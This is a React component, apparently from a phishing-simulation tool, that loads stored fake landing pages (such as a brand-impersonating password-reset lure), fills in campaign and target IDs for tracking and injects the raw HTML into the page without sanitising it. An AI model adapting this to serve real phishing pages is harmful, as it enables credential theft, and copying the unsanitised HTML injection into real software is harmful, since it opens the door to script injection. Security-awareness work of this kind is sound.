import { useEffect, useState } from 'react';
import { useParams, useSearchParams } from 'react-router-dom';
import { landingTemplates } from '../data/landingTemplates';

export default function LandingPage() {
    const { id } = useParams(); // ID da PhishingPage salva no banco
    const [searchParams] = useSearchParams();
    const campaignId = searchParams.get('c') || '';
    const targetId = searchParams.get('t') || '';

    const [htmlContent, setHtmlContent] = useState<string>(
        '<div style="padding: 2rem; text-align: center; font-family: sans-serif;">Carregando ambiente seguro...</div>'
    );

    useEffect(() => {
        if (!id) return;

        // Busca o HTML da página falsa cadastrada no banco de dados
        fetch(`http://localhost:5000/api/PhishingPages/${id}`)
            .then(res => {
                if (!res.ok) throw new Error('Página não encontrada');
                return res.json();
            })
            .then(data => {
                if (data && data.conteudoHtml) {
                    // Persistência simplificada: as armadilhas passam a guardar apenas o
                    // ID do molde oficial. Resolve o ID para o HTML do catálogo; se não
                    // casar, trata o valor como HTML bruto (compatibilidade com registros
                    // legados criados antes da refatoração do MVP).
                    const molde = landingTemplates.find((t) => t.id === data.conteudoHtml);
                    const rawHtml = molde ? molde.html : data.conteudoHtml;

                    // Preenche os placeholders dinamicamente com os dados da vítima.
                    // {{CAMPAIGN_ID}} e {{TARGET_ID}} alimentam o gatilho de telemetria
                    // embutido no <form> dos moldes (ex.: HBO Max - Redefinição de Senha).
                    const processedHtml = rawHtml
                        .replace(/{{CAMPAIGN_ID}}/g, campaignId)
                        .replace(/{{TARGET_ID}}/g, targetId);

                    setHtmlContent(processedHtml);
                }
            })
            .catch(() =>
                setHtmlContent('<div style="padding: 2rem; text-align: center; font-family: sans-serif; color: red;">Erro 404: Página não encontrada ou link expirado.</div>')
            );
    }, [id, campaignId, targetId]);

    // Renderiza o HTML injetando ele diretamente na DOM da página
    return <div dangerouslySetInnerHTML={{ __html: htmlContent }} />;
}
